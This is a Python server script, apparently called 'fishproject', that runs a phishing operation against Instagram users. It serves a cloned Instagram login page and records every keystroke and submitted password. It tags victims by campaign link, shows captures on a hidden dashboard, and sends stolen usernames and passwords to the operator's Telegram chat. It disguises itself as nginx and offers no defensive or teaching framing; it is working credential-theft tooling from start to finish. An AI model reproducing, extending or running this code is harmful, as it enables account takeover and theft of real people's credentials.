#!/usr/bin/env python3
"""
fishproject - Instagram-lookalike login page + live keystroke/credential listener.

Serves the cloned login page on a port you pick and logs every keystroke and every
submitted credential to logs/captures.log (JSONL) while streaming them to stdout.

Extras in this build:
  * campaign tags    - link with ?c=victim-name and every event is tagged
  * live dashboard   - token-gated /dash page, auto-refreshing, view it on your phone
  * telegram push    - set FP_TELEGRAM_TOKEN + FP_TELEGRAM_CHAT to get creds on your phone

Run:  python server.py            (default port 8080)
      python server.py 9090       (custom port)
      set PORT=9090 & python server.py

Env:
  FP_TELEGRAM_TOKEN   bot token from @BotFather (optional)
  FP_TELEGRAM_CHAT    chat id to push to (optional)
  FP_DASH_TOKEN       fixed dashboard token (optional; otherwise persisted in logs/)
"""

import json
import os
import secrets
import sys
import threading
import urllib.parse
import urllib.request
from collections import deque
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

ROOT = os.path.dirname(os.path.abspath(__file__))
PUBLIC = os.path.join(ROOT, "public")
LOG_DIR = os.path.join(ROOT, "logs")
LOG_FILE = os.path.join(LOG_DIR, "captures.log")
DASH_HTML = os.path.join(ROOT, "dashboard.html")
TOKEN_FILE = os.path.join(LOG_DIR, "dash_token.txt")

DEFAULT_PORT = 8080
MAX_EVENTS = 1000

TELEGRAM_TOKEN = os.environ.get("FP_TELEGRAM_TOKEN", "").strip()
TELEGRAM_CHAT = os.environ.get("FP_TELEGRAM_CHAT", "").strip()

# Terminal colors (Windows 10+ conhost supports ANSI once enabled).
ESC = "\x1b["
C_RESET = ESC + "0m"
C_DIM = ESC + "90m"
C_RED = ESC + "91m"
C_GREEN = ESC + "92m"
C_YELLOW = ESC + "93m"
C_BLUE = ESC + "94m"
C_MAGENTA = ESC + "95m"
C_CYAN = ESC + "96m"

_log_lock = threading.Lock()
_events = deque(maxlen=MAX_EVENTS)
_events_lock = threading.Lock()


def enable_ansi():
    if os.name == "nt":
        try:
            import ctypes

            k = ctypes.windll.kernel32
            k.SetConsoleMode(k.GetStdHandle(-11), 7)
        except Exception:
            pass


def now():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def load_dash_token():
    """Persisted so the dashboard URL survives restarts."""
    env = os.environ.get("FP_DASH_TOKEN", "").strip()
    if env:
        return env
    try:
        if os.path.isfile(TOKEN_FILE):
            t = open(TOKEN_FILE, "r", encoding="utf-8").read().strip()
            if t:
                return t
    except Exception:
        pass
    t = secrets.token_urlsafe(16)
    try:
        os.makedirs(LOG_DIR, exist_ok=True)
        with open(TOKEN_FILE, "w", encoding="utf-8") as fh:
            fh.write(t)
    except Exception:
        pass
    return t


DASH_TOKEN = ""


def write_log(record):
    """Append one JSON record to the log file (thread-safe)."""
    os.makedirs(LOG_DIR, exist_ok=True)
    line = json.dumps(record, ensure_ascii=False)
    with _log_lock:
        with open(LOG_FILE, "a", encoding="utf-8") as fh:
            fh.write(line + "\n")


def add_event(record):
    with _events_lock:
        _events.append(record)


def notify_telegram(text):
    """Fire-and-forget push. Silently no-ops if not configured."""
    if not (TELEGRAM_TOKEN and TELEGRAM_CHAT):
        return

    def _send():
        try:
            url = "https://api.telegram.org/bot%s/sendMessage" % TELEGRAM_TOKEN
            payload = urllib.parse.urlencode(
                {"chat_id": TELEGRAM_CHAT, "text": text, "parse_mode": "HTML"}
            ).encode()
            req = urllib.request.Request(url, data=payload)
            urllib.request.urlopen(req, timeout=6).read()
        except Exception:
            pass

    threading.Thread(target=_send, daemon=True).start()


def lan_ip():
    try:
        import socket

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def banner(port):
    ip = lan_ip()
    print(C_CYAN + "=" * 66 + C_RESET)
    print(C_CYAN + "  fishproject  ::  listener online" + C_RESET)
    print(C_CYAN + "=" * 66 + C_RESET)
    print(f"  page      : {C_BLUE}http://{ip}:{port}/{C_RESET}")
    print(f"  dashboard : {C_MAGENTA}http://{ip}:{port}/dash?k={DASH_TOKEN}{C_RESET}")
    print(f"  local     : http://127.0.0.1:{port}/")
    print(f"  logfile   : {LOG_FILE}")
    if TELEGRAM_TOKEN and TELEGRAM_CHAT:
        print(f"  telegram  : {C_GREEN}ON{C_RESET} -> chat {TELEGRAM_CHAT}")
    else:
        print(f"  telegram  : {C_DIM}off (set FP_TELEGRAM_TOKEN + FP_TELEGRAM_CHAT){C_RESET}")
    print(C_CYAN + "-" * 66 + C_RESET)
    print(C_DIM + "  waiting for victims..." + C_RESET)
    print(C_CYAN + "=" * 66 + C_RESET)


class Handler(BaseHTTPRequestHandler):
    server_version = "nginx"  # cosmetic - don't advertise python

    # --- helpers ---------------------------------------------------------
    def _send(self, code, body=b"", ctype="text/plain", extra=None):
        if isinstance(body, str):
            body = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        if extra:
            for k, v in extra.items():
                self.send_header(k, v)
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(body)

    def _client_ip(self):
        fwd = self.headers.get("X-Forwarded-For")
        if fwd:
            return fwd.split(",")[0].strip()
        return self.client_address[0]

    def log_message(self, fmt, *args):
        pass

    # --- routes ----------------------------------------------------------
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path or "/"
        qs = urllib.parse.parse_qs(parsed.query)

        if path == "/dash":
            if qs.get("k", [""])[0] != DASH_TOKEN or not DASH_TOKEN:
                self._send(404, "not found")
                return
            try:
                with open(DASH_HTML, "rb") as fh:
                    html = fh.read()
            except Exception:
                self._send(500, "dashboard.html missing")
                return
            self._send(200, html, "text/html; charset=utf-8")
            return

        if path == "/api/events":
            if qs.get("k", [""])[0] != DASH_TOKEN or not DASH_TOKEN:
                self._send(404, "not found")
                return
            with _events_lock:
                payload = json.dumps(list(_events), ensure_ascii=False)
            self._send(200, payload, "application/json")
            return

        if path in ("/", ""):
            path = "/index.html"

        rel = os.path.normpath(path).lstrip("/\\")
        if rel.startswith("..") or os.path.isabs(rel):
            self._send(403, "forbidden")
            return

        full = os.path.join(PUBLIC, rel)
        if not os.path.isfile(full):
            self._send(404, "not found")
            return

        ext = os.path.splitext(full)[1].lower()
        ctypes = {
            ".html": "text/html; charset=utf-8",
            ".css": "text/css; charset=utf-8",
            ".js": "application/javascript; charset=utf-8",
            ".json": "application/json",
            ".png": "image/png",
            ".jpg": "image/jpeg",
            ".jpeg": "image/jpeg",
            ".gif": "image/gif",
            ".svg": "image/svg+xml",
            ".ico": "image/x-icon",
            ".woff2": "font/woff2",
            ".woff": "font/woff",
            ".ttf": "font/ttf",
        }
        ctype = ctypes.get(ext, "application/octet-stream")
        with open(full, "rb") as fh:
            data = fh.read()

        ip = self._client_ip()
        ua = self.headers.get("User-Agent", "-")
        campaign = qs.get("c", [""])[0]
        if path == "/index.html":
            tag = f" {C_MAGENTA}[{campaign}]{C_RESET}" if campaign else ""
            print(f"{C_DIM}[{now()}]{C_RESET} {C_GREEN}VISIT{C_RESET}   {ip}{tag}  {C_DIM}{ua[:55]}{C_RESET}")
            rec = {
                "ts": datetime.now().isoformat(),
                "event": "visit",
                "ip": ip,
                "ua": ua,
                "campaign": campaign,
                "data": {"path": path},
            }
            write_log(rec)
            add_event(rec)

        self._send(200, data, ctype)

    def do_HEAD(self):
        self.do_GET()

    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        if path not in ("/api/capture", "/collect", "/login"):
            self._send(404, "not found")
            return

        length = int(self.headers.get("Content-Length", 0) or 0)
        raw = self.rfile.read(length) if length else b""

        try:
            data = json.loads(raw.decode("utf-8") or "{}")
        except Exception:
            data = {"_raw": raw.decode("utf-8", "replace")}

        ip = self._client_ip()
        ua = self.headers.get("User-Agent", "-")
        event = data.get("type", "unknown")
        campaign = str(data.get("campaign") or "")[:64]

        record = {
            "ts": datetime.now().isoformat(),
            "event": event,
            "ip": ip,
            "ua": ua,
            "campaign": campaign,
            "data": data,
        }
        write_log(record)
        add_event(record)

        self._print_event(event, data, ip, campaign)

        self._send(200, b'{"ok":true}', "application/json")

    # --- live console rendering -----------------------------------------
    def _print_event(self, event, data, ip, campaign=""):
        ts = f"{C_DIM}[{now()}]{C_RESET}"
        tag = f" {C_MAGENTA}[{campaign}]{C_RESET}" if campaign else ""
        if event == "credentials":
            user = data.get("username", "") or data.get("user", "")
            pw = data.get("password", "") or data.get("pass", "")
            print()
            print(f"{ts} {C_RED}\u2716 CREDENTIALS{C_RESET}  {C_DIM}{ip}{C_RESET}{tag}")
            print(f"        {C_CYAN}user{C_RESET} : {C_YELLOW}{user}{C_RESET}")
            print(f"        {C_CYAN}pass{C_RESET} : {C_YELLOW}{pw}{C_RESET}")
            print()
            notify_telegram(
                "\U0001F3A3 <b>Instagram creds</b>\n"
                + (f"campaign: <code>{campaign}</code>\n" if campaign else "")
                + f"user: <code>{user}</code>\n"
                + f"pass: <code>{pw}</code>\n"
                + f"ip: <code>{ip}</code>"
            )
        elif event in ("keystroke", "keystrokes"):
            if event == "keystroke":
                field = data.get("field", "?")
                key = data.get("key", "")
                value = data.get("value", "")
                if len(str(key)) > 1:
                    key = f"<{key}>"
                print(f"{ts} {C_BLUE}key{C_RESET}  [{field}] {C_DIM}{key}{C_RESET}  -> {C_GREEN}{value}{C_RESET}")
            else:
                keys = data.get("keys", [])
                last = keys[-1] if keys else {}
                print(
                    f"{ts} {C_BLUE}keys{C_RESET} x{data.get('count', len(keys))}  "
                    f"[{last.get('field','?')}] -> {C_GREEN}{last.get('value','')}{C_RESET}"
                )
        else:
            print(f"{ts} {C_DIM}{event}: {json.dumps(data, ensure_ascii=False)}{C_RESET}")


def main():
    global DASH_TOKEN
    enable_ansi()
    DASH_TOKEN = load_dash_token()

    port = DEFAULT_PORT
    if len(sys.argv) > 1:
        try:
            port = int(sys.argv[1])
        except ValueError:
            pass
    elif os.environ.get("PORT"):
        try:
            port = int(os.environ["PORT"])
        except ValueError:
            pass

    os.makedirs(LOG_DIR, exist_ok=True)
    os.makedirs(PUBLIC, exist_ok=True)

    httpd = ThreadingHTTPServer(("0.0.0.0", port), Handler)
    banner(port)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{C_DIM}shutting down; log kept at {LOG_FILE}{C_RESET}")


if __name__ == "__main__":
    main()
